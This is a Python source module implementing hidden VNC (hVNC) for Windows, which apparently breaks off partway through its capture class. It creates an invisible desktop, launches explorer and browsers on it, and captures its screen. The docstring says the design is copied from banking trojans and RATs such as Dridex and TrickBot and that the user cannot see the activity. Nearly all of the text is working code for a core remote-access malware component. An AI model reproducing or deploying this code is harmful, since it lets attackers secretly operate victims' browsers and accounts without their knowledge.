"""Hidden VNC (hVNC) implementation using Windows CreateDesktop API.

This module provides a proper hVNC implementation that creates an invisible
desktop where applications can run without being visible to the user.

How it works:
1. Creates a new Windows desktop using CreateDesktop API
2. Launches explorer.exe on the hidden desktop for shell functionality
3. Applications are launched on this hidden desktop (via lpDesktop)
4. Screen is captured using BitBlt from the hidden desktop's DC
5. Input is sent to the hidden desktop via SendInput after switching thread

The key difference from offscreen windows:
- CreateDesktop creates a completely separate GUI environment
- The user cannot see anything happening on the hidden desktop
- Windows on hidden desktop are rendered properly by GPU
- Clipboard is shared between desktops (same Window Station)

Based on techniques documented in banking trojans and RATs:
- Carberp, Hesperbot, Dridex, TrickBot all use similar hVNC techniques
- Microsoft documentation: CreateDesktop, SetThreadDesktop APIs

Reference: MalwareTech CreateDesktop example
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import queue
import subprocess
import threading
import time
import uuid
from ctypes import wintypes
from dataclasses import dataclass
from fractions import Fraction
from typing import Callable

logger = logging.getLogger(__name__)

# Only available on Windows
if platform.system() != "Windows":
    raise ImportError("hVNC module only works on Windows")

# Windows API setup
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

# Desktop access rights
DESKTOP_READOBJECTS = 0x0001
DESKTOP_CREATEWINDOW = 0x0002
DESKTOP_CREATEMENU = 0x0004
DESKTOP_HOOKCONTROL = 0x0008
DESKTOP_JOURNALRECORD = 0x0010
DESKTOP_JOURNALPLAYBACK = 0x0020
DESKTOP_ENUMERATE = 0x0040
DESKTOP_WRITEOBJECTS = 0x0080
DESKTOP_SWITCHDESKTOP = 0x0100
GENERIC_ALL = 0x10000000

DESKTOP_ALL_ACCESS = (
    DESKTOP_READOBJECTS
    | DESKTOP_CREATEWINDOW
    | DESKTOP_CREATEMENU
    | DESKTOP_HOOKCONTROL
    | DESKTOP_JOURNALRECORD
    | DESKTOP_JOURNALPLAYBACK
    | DESKTOP_ENUMERATE
    | DESKTOP_WRITEOBJECTS
    | DESKTOP_SWITCHDESKTOP
)

# GDI constants
SRCCOPY = 0x00CC0020
DIB_RGB_COLORS = 0
BI_RGB = 0
HORZRES = 8
VERTRES = 10
SM_CXSCREEN = 0
SM_CYSCREEN = 1
CAPTUREBLT = 0x40000000
BLACKNESS = 0x00000042
WHITENESS = 0x00FF0062

# PrintWindow constants (for Windows 11 24H2 compatibility)
PW_CLIENTONLY = 0x1
PW_RENDERFULLCONTENT = 0x2

# Window styles
WS_VISIBLE = 0x10000000
WS_MINIMIZE = 0x20000000
WS_EX_TOOLWINDOW = 0x00000080
WS_EX_NOACTIVATE = 0x08000000
GWL_STYLE = -16
GWL_EXSTYLE = -20
GW_HWNDNEXT = 2

SW_HIDE = 0
SW_SHOW = 5
SW_SHOWNOACTIVATE = 4

# SetWindowPos flags
SWP_NOSIZE = 0x0001
SWP_NOZORDER = 0x0004
SWP_NOACTIVATE = 0x0010
SWP_SHOWWINDOW = 0x0040

# SendInput constants
INPUT_MOUSE = 0
INPUT_KEYBOARD = 1
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
MOUSEEVENTF_HWHEEL = 0x1000
MOUSEEVENTF_ABSOLUTE = 0x8000
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_UNICODE = 0x0004
KEYEVENTF_EXTENDEDKEY = 0x0001


class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength", wintypes.DWORD),
        ("lpSecurityDescriptor", wintypes.LPVOID),
        ("bInheritHandle", wintypes.BOOL),
    ]


# CreateProcess structures for direct process creation on hidden desktop
class STARTUPINFOW(ctypes.Structure):
    """Windows STARTUPINFOW structure for CreateProcessW."""
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    """Windows PROCESS_INFORMATION structure."""
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


# CreateProcess flags
CREATE_NEW_CONSOLE = 0x00000010
CREATE_NEW_PROCESS_GROUP = 0x00000200
DETACHED_PROCESS = 0x00000008
CREATE_NO_WINDOW = 0x08000000
CREATE_UNICODE_ENVIRONMENT = 0x00000400
CREATE_SUSPENDED = 0x00000004
CREATE_BREAKAWAY_FROM_JOB = 0x01000000
STARTF_USESHOWWINDOW = 0x00000001
STARTF_USEPOSITION = 0x00000004
STARTF_USESIZE = 0x00000002

# Job Object structures and constants for child process desktop inheritance
JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE = 0x00002000
JOB_OBJECT_LIMIT_BREAKAWAY_OK = 0x00000800
JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK = 0x00001000
JOB_OBJECT_EXTENDED_LIMIT_INFORMATION = 9


class JOBOBJECT_BASIC_LIMIT_INFORMATION(ctypes.Structure):
    """Job object basic limit information."""
    _fields_ = [
        ("PerProcessUserTimeLimit", ctypes.c_int64),
        ("PerJobUserTimeLimit", ctypes.c_int64),
        ("LimitFlags", wintypes.DWORD),
        ("MinimumWorkingSetSize", ctypes.c_size_t),
        ("MaximumWorkingSetSize", ctypes.c_size_t),
        ("ActiveProcessLimit", wintypes.DWORD),
        ("Affinity", ctypes.POINTER(ctypes.c_ulong)),
        ("PriorityClass", wintypes.DWORD),
        ("SchedulingClass", wintypes.DWORD),
    ]


class IO_COUNTERS(ctypes.Structure):
    """IO counters structure."""
    _fields_ = [
        ("ReadOperationCount", ctypes.c_uint64),
        ("WriteOperationCount", ctypes.c_uint64),
        ("OtherOperationCount", ctypes.c_uint64),
        ("ReadTransferCount", ctypes.c_uint64),
        ("WriteTransferCount", ctypes.c_uint64),
        ("OtherTransferCount", ctypes.c_uint64),
    ]


class JOBOBJECT_EXTENDED_LIMIT_INFORMATION(ctypes.Structure):
    """Job object extended limit information."""
    _fields_ = [
        ("BasicLimitInformation", JOBOBJECT_BASIC_LIMIT_INFORMATION),
        ("IoInfo", IO_COUNTERS),
        ("ProcessMemoryLimit", ctypes.c_size_t),
        ("JobMemoryLimit", ctypes.c_size_t),
        ("PeakProcessMemoryUsed", ctypes.c_size_t),
        ("PeakJobMemoryUsed", ctypes.c_size_t),
    ]


# Setup Job Object API
kernel32.CreateJobObjectW.argtypes = [
    ctypes.POINTER(SECURITY_ATTRIBUTES),  # lpJobAttributes
    wintypes.LPCWSTR,                      # lpName
]
kernel32.CreateJobObjectW.restype = wintypes.HANDLE

kernel32.AssignProcessToJobObject.argtypes = [
    wintypes.HANDLE,  # hJob
    wintypes.HANDLE,  # hProcess
]
kernel32.AssignProcessToJobObject.restype = wintypes.BOOL

kernel32.SetInformationJobObject.argtypes = [
    wintypes.HANDLE,   # hJob
    wintypes.DWORD,    # JobObjectInformationClass
    wintypes.LPVOID,   # lpJobObjectInformation
    wintypes.DWORD,    # cbJobObjectInformationLength
]
kernel32.SetInformationJobObject.restype = wintypes.BOOL

kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
kernel32.ResumeThread.restype = wintypes.DWORD

# Setup CreateProcessW
kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR,      # lpApplicationName
    wintypes.LPWSTR,       # lpCommandLine
    ctypes.POINTER(SECURITY_ATTRIBUTES),  # lpProcessAttributes
    ctypes.POINTER(SECURITY_ATTRIBUTES),  # lpThreadAttributes
    wintypes.BOOL,         # bInheritHandles
    wintypes.DWORD,        # dwCreationFlags
    wintypes.LPVOID,       # lpEnvironment
    wintypes.LPCWSTR,      # lpCurrentDirectory
    ctypes.POINTER(STARTUPINFOW),         # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),  # lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", wintypes.DWORD),
        ("biWidth", wintypes.LONG),
        ("biHeight", wintypes.LONG),
        ("biPlanes", wintypes.WORD),
        ("biBitCount", wintypes.WORD),
        ("biCompression", wintypes.DWORD),
        ("biSizeImage", wintypes.DWORD),
        ("biXPelsPerMeter", wintypes.LONG),
        ("biYPelsPerMeter", wintypes.LONG),
        ("biClrUsed", wintypes.DWORD),
        ("biClrImportant", wintypes.DWORD),
    ]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]


# ULONG_PTR is pointer-sized: 32-bit on x86, 64-bit on x64
ULONG_PTR = ctypes.c_void_p


class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ("dx", wintypes.LONG),
        ("dy", wintypes.LONG),
        ("mouseData", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]


class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]


class HARDWAREINPUT(ctypes.Structure):
    _fields_ = [
        ("uMsg", wintypes.DWORD),
        ("wParamL", wintypes.WORD),
        ("wParamH", wintypes.WORD),
    ]


class INPUT_UNION(ctypes.Union):
    _fields_ = [
        ("mi", MOUSEINPUT),
        ("ki", KEYBDINPUT),
        ("hi", HARDWAREINPUT),
    ]


class INPUT(ctypes.Structure):
    _fields_ = [
        ("type", wintypes.DWORD),
        ("union", INPUT_UNION),
    ]


# Function signatures
# Note: Using LPVOID for lpsa parameter to allow passing ctypes.byref() or None
user32.CreateDesktopW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPVOID,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.LPVOID,  # LPSECURITY_ATTRIBUTES - use LPVOID for compatibility with byref()
]
user32.CreateDesktopW.restype = wintypes.HANDLE

user32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
user32.OpenDesktopW.restype = wintypes.HANDLE

user32.CloseDesktop.argtypes = [wintypes.HANDLE]
user32.CloseDesktop.restype = wintypes.BOOL

user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
user32.SetThreadDesktop.restype = wintypes.BOOL

user32.GetThreadDesktop.argtypes = [wintypes.DWORD]
user32.GetThreadDesktop.restype = wintypes.HANDLE

user32.SwitchDesktop.argtypes = [wintypes.HANDLE]
user32.SwitchDesktop.restype = wintypes.BOOL

user32.BlockInput.argtypes = [wintypes.BOOL]
user32.BlockInput.restype = wintypes.BOOL

user32.GetDC.argtypes = [wintypes.HWND]
user32.GetDC.restype = wintypes.HDC

user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
user32.ReleaseDC.restype = wintypes.INT

user32.GetSystemMetrics.argtypes = [wintypes.INT]
user32.GetSystemMetrics.restype = wintypes.INT

user32.SendInput.argtypes = [wintypes.UINT, ctypes.POINTER(INPUT), wintypes.INT]
user32.SendInput.restype = wintypes.UINT

user32.SetCursorPos.argtypes = [wintypes.INT, wintypes.INT]
user32.SetCursorPos.restype = wintypes.BOOL

user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM),
    wintypes.LPARAM,
]
user32.EnumWindows.restype = wintypes.BOOL

user32.EnumDesktopWindows.argtypes = [
    wintypes.HANDLE,
    ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM),
    wintypes.LPARAM,
]
user32.EnumDesktopWindows.restype = wintypes.BOOL

user32.IsWindowVisible.argtypes = [wintypes.HWND]
user32.IsWindowVisible.restype = wintypes.BOOL

user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
user32.GetWindowRect.restype = wintypes.BOOL

user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
user32.GetWindowTextW.restype = wintypes.INT

user32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
user32.PrintWindow.restype = wintypes.BOOL

user32.GetWindowLongW.argtypes = [wintypes.HWND, wintypes.INT]
user32.GetWindowLongW.restype = wintypes.LONG

user32.GetWindow.argtypes = [wintypes.HWND, wintypes.UINT]
user32.GetWindow.restype = wintypes.HWND

user32.GetTopWindow.argtypes = [wintypes.HWND]
user32.GetTopWindow.restype = wintypes.HWND

user32.GetDesktopWindow.argtypes = []
user32.GetDesktopWindow.restype = wintypes.HWND

user32.GetWindowDC.argtypes = [wintypes.HWND]
user32.GetWindowDC.restype = wintypes.HDC

user32.IsIconic.argtypes = [wintypes.HWND]
user32.IsIconic.restype = wintypes.BOOL

gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
gdi32.CreateCompatibleDC.restype = wintypes.HDC

gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP

gdi32.CreateDCW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPVOID,
]
gdi32.CreateDCW.restype = wintypes.HDC

gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
gdi32.SelectObject.restype = wintypes.HGDIOBJ

gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
gdi32.DeleteObject.restype = wintypes.BOOL

gdi32.DeleteDC.argtypes = [wintypes.HDC]
gdi32.DeleteDC.restype = wintypes.BOOL

gdi32.BitBlt.argtypes = [
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.DWORD,
]
gdi32.BitBlt.restype = wintypes.BOOL

gdi32.StretchBlt.argtypes = [
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.DWORD,
]
gdi32.StretchBlt.restype = wintypes.BOOL

gdi32.PatBlt.argtypes = [
    wintypes.HDC,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.INT,
    wintypes.DWORD,
]
gdi32.PatBlt.restype = wintypes.BOOL

gdi32.GetDIBits.argtypes = [
    wintypes.HDC,
    wintypes.HBITMAP,
    wintypes.UINT,
    wintypes.UINT,
    wintypes.LPVOID,
    ctypes.POINTER(BITMAPINFO),
    wintypes.UINT,
]
gdi32.GetDIBits.restype = wintypes.INT

gdi32.GetDeviceCaps.argtypes = [wintypes.HDC, wintypes.INT]
gdi32.GetDeviceCaps.restype = wintypes.INT

kernel32.GetCurrentThreadId.argtypes = []
kernel32.GetCurrentThreadId.restype = wintypes.DWORD

kernel32.ExpandEnvironmentStringsW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.DWORD]
kernel32.ExpandEnvironmentStringsW.restype = wintypes.DWORD


@dataclass
class WindowInfo:
    """Information about a window on the hidden desktop."""
    hwnd: int
    title: str
    rect: tuple[int, int, int, int]  # left, top, right, bottom
    visible: bool


class HiddenDesktop:
    """Manages a hidden Windows desktop.
    
    This class creates and manages a hidden desktop where applications
    can run invisibly to the user.
    """
    
    def __init__(self, name: str | None = None):
        """Create a hidden desktop.
        
        Args:
            name: Desktop name (auto-generated if None)
        """
        self._name = name or f"hVNC_{uuid.uuid4().hex[:8]}"
        self._handle: wintypes.HANDLE | None = None
        self._original_desktop: wintypes.HANDLE | None = None
        self._desktop_path = f"WinSta0\\{self._name}"
        self._processes: list[subprocess.Popen] = []
        self._shell_started = False
        
        # Create or open the desktop
        self._handle = self._open_or_create()
        if not self._handle:
            raise RuntimeError(f"Failed to create hidden desktop: {self._name}")
        
        # Store original desktop for restoration
        self._original_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
        
        logger.info("Created hidden desktop: %s (handle=%d)", self._name, self._handle)
    
    def _open_or_create(self) -> wintypes.HANDLE | None:
        """Open existing desktop or create new one."""
        # Try to open existing desktop first
        handle = user32.OpenDesktopW(self._name, 0, False, GENERIC_ALL)
        if handle:
            logger.debug("Opened existing desktop: %s", self._name)
            return handle
        
        # Create new desktop
        sa = SECURITY_ATTRIBUTES()
        sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
        sa.lpSecurityDescriptor = None
        sa.bInheritHandle = False
        
        handle = user32.CreateDesktopW(
            self._name,
            None,
            None,
            0,
            DESKTOP_ALL_ACCESS,
            ctypes.byref(sa),
        )
        
        if not handle:
            error = ctypes.get_last_error()
            logger.error("CreateDesktopW failed: error=%d", error)
            return None
        
        return handle
    
    @property
    def name(self) -> str:
        """Get desktop name."""
        return self._name
    
    @property
    def handle(self) -> wintypes.HANDLE | None:
        """Get desktop handle."""
        return self._handle
    
    @property
    def path(self) -> str:
        """Get full desktop path (WinSta0\\name)."""
        return self._desktop_path
    
    def start_shell(self) -> bool:
        """Start explorer.exe on the hidden desktop for shell functionality.
        
        This is important for:
        - Start menu, taskbar
        - Proper window management
        - Shell extension loading
        """
        if self._shell_started:
            return True
        
        if not self._handle:
            return False
        
        # Get explorer.exe path
        explorer_path = ctypes.create_unicode_buffer(260)
        kernel32.ExpandEnvironmentStringsW("%windir%\\explorer.exe", explorer_path, 260)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_SHOW  # Explorer needs to be visible
        
        try:
            # First, switch to the hidden desktop temporarily to "activate" it
            # This helps ensure the desktop is properly initialized before launching shell
            old_desktop = user32.GetThreadDesktop(kernel32.GetCurrentThreadId())
            if user32.SetThreadDesktop(self._handle):
                # Force a DC creation to initialize GDI on this desktop
                test_dc = user32.GetDC(None)
                if test_dc:
                    user32.ReleaseDC(None, test_dc)
                # Switch back to original desktop
                user32.SetThreadDesktop(old_desktop)
            
            # Start explorer.exe with /separate flag to force new process
            # This helps create a proper shell environment on the hidden desktop
            proc = subprocess.Popen(
                [explorer_path.value, "/separate"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.CREATE_NEW_PROCESS_GROUP,
            )
            self._processes.append(proc)
            self._shell_started = True
            
            # Wait longer for explorer to fully initialize
            # Hidden desktops need more time because they're not the active desktop
            time.sleep(3.0)
            
            logger.info("Started shell on hidden desktop (PID=%d)", proc.pid)
            return True
        except Exception as exc:
            logger.error("Failed to start shell: %s", exc)
            return False
    
    def launch_application(
        self,
        executable: str,
        args: list[str] | None = None,
        working_dir: str | None = None,
        show_window: bool = True,
        use_createprocess: bool = True,
    ) -> subprocess.Popen | None:
        """Launch an application on the hidden desktop.
        
        Uses CreateProcessW directly via ctypes for better control over desktop assignment.
        This is more reliable than subprocess.Popen for hidden desktop scenarios.
        
        Args:
            executable: Path to executable or application name
            args: Command line arguments
            working_dir: Working directory
            show_window: Whether to show the window (on hidden desktop)
            use_createprocess: Use CreateProcessW directly (recommended for hidden desktop)
        
        Returns:
            Popen-like object or None if failed
        """
        if not self._handle:
            logger.error("Cannot launch application: desktop not initialized")
            return None
        
        # Build command line
        if args:
            # Properly quote arguments with spaces
            cmd_parts = [executable]
            for arg in args:
                if ' ' in arg and not (arg.startswith('"') and arg.endswith('"')):
                    cmd_parts.append(f'"{arg}"')
                else:
                    cmd_parts.append(arg)
            command_line = ' '.join(cmd_parts)
        else:
            command_line = executable
        
        logger.debug("Launching on hidden desktop: %s", command_line)
        logger.debug("Desktop path: %s", self._desktop_path)
        
        if use_createprocess:
            # Use CreateProcessW directly for better hidden desktop support
            return self._launch_with_createprocess(
                executable, command_line, working_dir, show_window
            )
        else:
            # Fallback to subprocess.Popen
            return self._launch_with_popen(
                executable, args, working_dir, show_window
            )
    
    def _launch_with_createprocess(
        self,
        executable: str,
        command_line: str,
        working_dir: str | None,
        show_window: bool,
        use_job_object: bool = True,
    ) -> subprocess.Popen | None:
        """Launch using CreateProcessW directly via ctypes with Job Object.
        
        This method provides better control over the desktop assignment
        and uses Job Object to help manage child processes.
        
        For browsers on Windows 11 24H2, child processes (renderers, GPU) are still
        created by the browser itself and may not inherit desktop assignment.
        Use browser flags (--disable-gpu-sandbox, --in-process-gpu) to mitigate this.
        
        Args:
            executable: Path to executable
            command_line: Full command line
            working_dir: Working directory
            show_window: Whether to show the window
            use_job_object: Use Job Object for process management
        """
        # Setup STARTUPINFOW
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)
        si.lpDesktop = self._desktop_path  # Critical: specify hidden desktop
        si.dwFlags = STARTF_USESHOWWINDOW
        si.wShowWindow = SW_SHOW if show_window else SW_HIDE
        
        # Setup PROCESS_INFORMATION
        pi = PROCESS_INFORMATION()
        
        # Creation flags
        # CREATE_SUSPENDED: Start suspended so we can assign to Job Object first
        # CREATE_NEW_CONSOLE: Needed for GUI applications
        # CREATE_NEW_PROCESS_GROUP: New process group for signal handling
        creation_flags = CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP
        if use_job_object:
            creation_flags |= CREATE_SUSPENDED
        
        # Create mutable command line buffer (required by CreateProcessW)
        cmd_buffer = ctypes.create_unicode_buffer(command_line, len(command_line) + 1)
        
        job_handle = None
        
        try:
            # Create Job Object if requested
            if use_job_object:
                job_name = f"HVNCJob_{uuid.uuid4().hex[:8]}"
                job_handle = kernel32.CreateJobObjectW(None, job_name)
                if job_handle:
                    # Configure Job Object - KILL_ON_JOB_CLOSE ensures all processes
                    # in the job are terminated when we close the handle
                    job_info = JOBOBJECT_EXTENDED_LIMIT_INFORMATION()
                    job_info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
                    kernel32.SetInformationJobObject(
                        job_handle,
                        JOB_OBJECT_EXTENDED_LIMIT_INFORMATION,
                        ctypes.byref(job_info),
                        ctypes.sizeof(job_info)
                    )
                    logger.debug("Created Job Object: %s", job_name)
            
            result = kernel32.CreateProcessW(
                None,                    # lpApplicationName (None = use command line)
                cmd_buffer,              # lpCommandLine
                None,                    # lpProcessAttributes
                None,                    # lpThreadAttributes
                False,                   # bInheritHandles
                creation_flags,          # dwCreationFlags
                None,                    # lpEnvironment (inherit)
                working_dir,             # lpCurrentDirectory
                ctypes.byref(si),        # lpStartupInfo
                ctypes.byref(pi),        # lpProcessInformation
            )
            
            if not result:
                error_code = ctypes.get_last_error()
                logger.error(
                    "CreateProcessW failed for %s: error=%d", 
                    executable, error_code
                )
                if job_handle:
                    kernel32.CloseHandle(job_handle)
                return None
            
            # Assign process to Job Object before resuming
            if use_job_object and job_handle:
                assign_result = kernel32.AssignProcessToJobObject(job_handle, pi.hProcess)
                if assign_result:
                    logger.debug("Assigned process %d to Job Object", pi.dwProcessId)
                else:
                    logger.warning("Failed to assign process to Job Object: %d", ctypes.get_last_error())
                
                # Resume the suspended process
                resume_result = kernel32.ResumeThread(pi.hThread)
                if resume_result == 0xFFFFFFFF:  # -1 = error
                    logger.warning("Failed to resume thread: %d", ctypes.get_last_error())
            
            # Close thread handle (we don't need it)
            kernel32.CloseHandle(pi.hThread)
            
            # Create a pseudo-Popen object for compatibility
            class ProcessHandle:
                def __init__(self, pid, handle, job=None):
                    self.pid = pid
                    self._handle = handle
                    self._job = job
                
                def poll(self):
                    exit_code = wintypes.DWORD()
                    if kernel32.GetExitCodeProcess(self._handle, ctypes.byref(exit_code)):
                        if exit_code.value == 259:  # STILL_ACTIVE
                            return None
                        return exit_code.value
                    return None
                
                def terminate(self):
                    kernel32.TerminateProcess(self._handle, 1)
                
                def __del__(self):
                    if self._handle:
                        kernel32.CloseHandle(self._handle)
                    if self._job:
                        kernel32.CloseHandle(self._job)
            
            proc = ProcessHandle(pi.dwProcessId, pi.hProcess, job_handle)
            self._processes.append(proc)
            
            logger.info(
                "Launched %s on hidden desktop via CreateProcessW (PID=%d, desktop=%s, job=%s)", 
                executable, pi.dwProcessId, self._desktop_path, 
                "yes" if job_handle else "no"
            )
            return proc
            
        except Exception as exc:
            logger.error("CreateProcessW exception for %s: %s", executable, exc)
            if job_handle:
                kernel32.CloseHandle(job_handle)
            return None
    
    def _launch_with_popen(
        self,
        executable: str,
        args: list[str] | None,
        working_dir: str | None,
        show_window: bool,
    ) -> subprocess.Popen | None:
        """Launch using subprocess.Popen (fallback method)."""
        cmd = [executable]
        if args:
            cmd.extend(args)
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = SW_SHOW if show_window else SW_HIDE
        
        try:
            proc = subprocess.Popen(
                cmd,
                startupinfo=startupinfo,
                cwd=working_dir,
                creationflags=subprocess.CREATE_NEW_CONSOLE,
            )
            self._processes.append(proc)
            logger.info("Launched %s on hidden desktop via Popen (PID=%d)", executable, proc.pid)
            return proc
        except Exception as exc:
            logger.error("Popen failed for %s: %s", executable, exc)
            return None
    
    def switch_to(self) -> bool:
        """Switch the current thread to this hidden desktop.
        
        This is needed for:
        - Capturing the desktop screen
        - Sending input to the desktop
        
        Returns:
            True if switch successful
        """
        if not self._handle:
            return False
        return bool(user32.SetThreadDesktop(self._handle))
    
    def switch_back(self) -> bool:
        """Switch thread back to original desktop."""
        if not self._original_desktop:
            return False
        return bool(user32.SetThreadDesktop(self._original_desktop))
    
    def enumerate_windows(self) -> list[WindowInfo]:
        """Enumerate all windows on this hidden desktop."""
        windows = []
        
        @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        def enum_callback(hwnd: int, lparam: int) -> bool:
            if not user32.IsWindowVisible(hwnd):
                return True
            
            # Get title
            title_buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, title_buf, 256)
            title = title_buf.value
            
            # Get rect
            rect = RECT()
            user32.GetWindowRect(hwnd, ctypes.byref(rect))
            
            # Skip zero-size windows
            if rect.right <= rect.left or rect.bottom <= rect.top:
                return True
            
            windows.append(WindowInfo(
                hwnd=hwnd,
                title=title,
                rect=(rect.left, rect.top, rect.right, rect.bottom),
                visible=True,
            ))
            return True
        
        user32.EnumDesktopWindows(self._handle, enum_callback, 0)
        return windows
    
    def close(self) -> None:
        """Close the hidden desktop and cleanup."""
        # Terminate all processes
        for proc in self._processes:
            try:
                proc.terminate()
                proc.wait(timeout=2.0)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._processes.clear()
        
        # Close desktop handle
        if self._handle:
            user32.CloseDesktop(self._handle)
            self._handle = None
        
        logger.info("Closed hidden desktop: %s", self._name)


class HiddenDesktopCapture:
    """Captures the screen from a hidden desktop.
    
    The capture thread STAYS on the hidden desktop permanently.
    This is crucial for proper hVNC operation - we can't just switch
    back and forth because GetDC/BitBlt operate on the CURRENT thread's desktop.
    """
    
    def __init__(
        self,
        desktop: HiddenDesktop,
        width: int = 1920,
        height: int = 1080,
        fps: int = 30,
        delay_start: bool = False,
        force_printwindow: bool | None = None,
    ):
        """Initialize capture for hidden desktop.
        
        Args:
            desktop: The hidden desktop to capture
            width: Capture width
            height: Capture height
            fps: Target framerate
            delay_start: If True, don't start capture thread immediately
            force_printwindow: If True, use PrintWindow mode immediately (for Win11 24H2)
                              If None, auto-detect based on Windows version
        """
        self._desktop = desktop
        self._width = width
        self._height = height
        self._fps = fps
        self._interval = 1.0 / fps
        
        # Thread synchronization
        self._stop_event = threading.Event()
        self._frame_lock = threading.Lock()
        self._frame: bytes | None = None
        self._frame_size = (width, height)
        self._initialized = threading.Event()
        self._capture_thread = None
        
        # Determine if we should use PrintWindow mode immediately
        # Windows 11 24H2 (build 26100+) has issues with BitBlt on hidden desktops
        if force_printwindow is None:
            force_printwindow = self._should_use_printwindow()
        
        if force_printwindow:
            self._use_printwindow_mode = True
            logger.info("PrintWindow mode enabled (Windows 11 24H2 compatibility)")
        
        if not delay_start:
            self.start_capture()
        
        logger.info("Started hidden desktop capture: %dx%d @ %d fps", width, height, fps)
    
    def _should_use_printwindow(self) -> bool:
        """Check if PrintWindow mode should be used based on Windows version.
        
        Windows 11 24H2 (build 26100+) has DWM changes that break BitBlt with hidden desktops.
        """
        # Check environment variable override
